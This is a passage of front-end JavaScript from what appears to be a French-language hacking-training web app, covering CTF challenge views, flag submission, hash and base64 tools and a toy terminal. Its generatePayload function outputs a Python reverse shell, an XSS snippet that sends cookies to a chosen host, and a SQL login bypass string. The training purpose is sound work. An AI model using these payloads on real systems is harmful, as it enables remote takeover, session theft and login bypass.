    else if(currentCTF.simType === "ctf_logs") { simC.innerHTML = `<div class="sim-box sim-blue"><div class="sim-header">Logs</div><div class="log-viewer">172.16.0.4 - SQLi attempt</div><input type="text" id="ctf-log-input" class="web-input" placeholder="IP..."><button class="auth-btn" style="background:#3b82f6;" onclick="checkCTFLog('${currentCTF.expectedFlag}')">Valider</button><div id="ctf-log-out" class="term-output"></div></div>`; }
    else { simC.innerHTML = ''; }
    
    document.getElementById('flag-input').value = '';
    document.getElementById('flag-result').style.display = 'none';
    switchView('challenge-view');
}

function checkCTFIDOR(flag) {
    const out = document.getElementById('ctf-idor-out');
    out.innerHTML = `<span style='color:var(--accent);'>Succès ! Résultat injecté : ${flag}</span>`;
}
function checkCTFLog(flag) {
    const val = document.getElementById('ctf-log-input').value.trim();
    if(val === "172.16.0.4") { document.getElementById('ctf-log-out').innerHTML = `<span style='color:var(--accent);'>${flag}</span>`; }
}

function submitFlag() {
    const ctfId = document.getElementById('challenge-view').dataset.ctfId;
    const flagVal = escapeHTML(document.getElementById('flag-input').value.trim());
    const resBox = document.getElementById('flag-result');
    let currentCTF = null; ctfDB.forEach(c => { if(c.id === ctfId) currentCTF = c; });
    
    resBox.style.display = 'block';
    if (flagVal === currentCTF.expectedFlag) {
        resBox.style.background = 'rgba(16, 185, 129, 0.2)'; resBox.style.color = 'var(--accent)'; resBox.style.border = '1px solid var(--accent)';
        resBox.innerText = `[+] PWNED ! +${currentCTF.points} PTS`;
        if (!state.completedCTF.includes(ctfId)) { state.completedCTF.push(ctfId); saveProgress(); renderCTF(); }
        setTimeout(() => switchView('ctf-view'), 2000);
    } else {
        resBox.style.background = 'rgba(239, 68, 68, 0.2)'; resBox.style.color = 'var(--danger)'; resBox.style.border = '1px solid var(--danger)';
        resBox.innerText = "[-] Flag Incorrect.";
    }
}

function generatePayload() {
    const type = document.getElementById('payload-type').value;
    const ip = escapeHTML(document.getElementById('payload-ip').value.trim());
    const out = document.getElementById('payload-out');
    if(type === 'py_rev') { out.innerHTML = `python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${ip}",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`; }
    else if(type === 'xss_cookie') { out.innerHTML = `&lt;script&gt;fetch('http://${ip}/log?cookie=' + btoa(document.cookie));&lt;/script&gt;`; }
    else if(type === 'sql_bypass') { out.innerHTML = `admin' OR 1=1 -- -`; }
}

async function generateHash() {
    const text = document.getElementById('tool-hash-in').value;
    const out = document.getElementById('tool-hash-out');
    if(!text) { out.innerText = "..."; return; }
    const encoder = new TextEncoder(); const data = encoder.encode(text);
    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    out.innerText = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

function handleBase64(action) {
    const text = escapeHTML(document.getElementById('tool-b64-in').value);
    const out = document.getElementById('tool-b64-out');
    try { if(action === 'encode') out.innerText = btoa(text); else out.innerText = atob(text); } 
    catch(e) { out.innerText = "Error: Invalid payload."; }
}

function toggleHUD() { document.getElementById('hud-terminal').classList.toggle('open'); }
function handleHUD(e) {
    if (e.key === 'Enter') {
        const inputEl = document.getElementById('hud-input');
        const outEl = document.getElementById('hud-output');
        const val = escapeHTML(inputEl.value.trim().toLowerCase());
        outEl.innerHTML += `<br><span style="color:var(--accent);">> ${val}</span>`;
        let response = val === "whoami" ? `User: ${activeUser || "Anonymous"}` : (val === "help" ? "Commandes : whoami, search" : "OK");
        outEl.innerHTML += `<br><span style="color:var(--text-main);">${response}</span>`;
        outEl.scrollTop = outEl.scrollHeight;
        inputEl.value = '';
    }
}

window.onload = initApp;
